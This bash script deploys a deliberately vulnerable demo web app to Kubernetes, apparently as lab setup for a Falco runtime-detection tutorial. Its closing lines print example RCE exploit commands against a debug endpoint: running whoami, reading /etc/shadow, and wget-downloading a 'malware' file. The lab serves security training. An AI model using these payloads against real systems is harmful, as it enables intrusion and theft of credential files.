#!/bin/bash
# ============================================================
# Deploy the Vulnerable Demo Application
# Run this FIRST — before installing Falco
# ============================================================

set -e

echo "==========================================="
echo "  Deploying Vulnerable Demo App"
echo "==========================================="
echo ""

# Deploy
echo "[1/3] Deploying webapp..."
kubectl apply -f k8s-deployment.yaml
echo ""

# Wait
echo "[2/3] Waiting for pod to be ready (may take 30-60s for package install)..."
kubectl wait --for=condition=ready pod -l app=webapp --timeout=180s
echo ""

# Verify
echo "[3/3] Verifying..."
echo ""
echo "Pod:"
kubectl get pod -l app=webapp
echo ""
echo "Service:"
kubectl get svc webapp
echo ""

echo "==========================================="
echo "  ✅ App is running!"
echo "==========================================="
echo ""
echo "Access the app:"
echo "  kubectl port-forward svc/webapp 5000:80"
echo "  curl http://localhost:5000"
echo "  curl http://localhost:5000/health"
echo ""
echo "Exploit the RCE vulnerability:"
echo "  curl 'http://localhost:5000/debug?cmd=whoami'"
echo "  curl 'http://localhost:5000/debug?cmd=cat+/etc/shadow'"
echo "  curl 'http://localhost:5000/debug?cmd=wget+http://example.com+-O+/tmp/malware'"
echo ""
echo "Next steps:"
echo "  cd ../01-falco-production/"
echo "  bash install.sh"
echo "  bash attack-simulation.sh"
